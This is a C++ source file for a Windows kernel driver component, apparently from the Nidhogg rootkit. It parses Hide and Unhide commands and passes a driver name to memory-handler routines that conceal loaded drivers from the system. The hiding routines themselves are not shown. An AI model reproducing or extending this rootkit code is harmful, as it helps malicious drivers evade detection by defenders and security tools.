#include "pch.h"
#include "DriverParser.h"
#include "MemoryHandler.h"

DriverParser::DriverParser() {
	this->optionsSize = 2;
	this->options = AllocateMemory<OptionMetadata*>(this->optionsSize * sizeof(OptionMetadata));

	if (!this->options)
		ExRaiseStatus(STATUS_INSUFFICIENT_RESOURCES);

	this->options[0] = { Options::Hide, { 1, { ArgType::WCharPtr } } };
	this->options[1] = { Options::Unhide, { 1, { ArgType::WCharPtr } } };
}

/*
* Description:
* Execute is responsible for executing a command and returning its value.
*
* Parameters:
* @commandId [Options]  -- Command to run.
* @args		 [PVOID*]	-- Array of args to send to the command.
*
* Returns:
* @status	 [NTSTATUS] -- Result of the command.
*/
NTSTATUS DriverParser::Execute(Options commandId, PVOID args[MAX_ARGS]) {
	UNICODE_STRING wDriverName = { 0 };
	ANSI_STRING aDriverName = { 0 };
	NTSTATUS status = STATUS_SUCCESS;

	// Converting string to unicode.
	RtlInitAnsiString(&aDriverName, (PCHAR)args[0]);
	status = RtlAnsiStringToUnicodeString(&wDriverName, &aDriverName, TRUE);

	if (!NT_SUCCESS(status))
		return status;

	switch (commandId) {
	case Options::Hide:
	{
		status = NidhoggMemoryHandler->HideDriver(wDriverName.Buffer);
		break;
	}
	case Options::Unhide:
	{
		status = NidhoggMemoryHandler->UnhideDriver(wDriverName.Buffer);
		break;
	}
	default:
	{
		status = STATUS_NOT_IMPLEMENTED;
		break;
	}
	}

	RtlFreeUnicodeString(&wDriverName);
	return status;
}
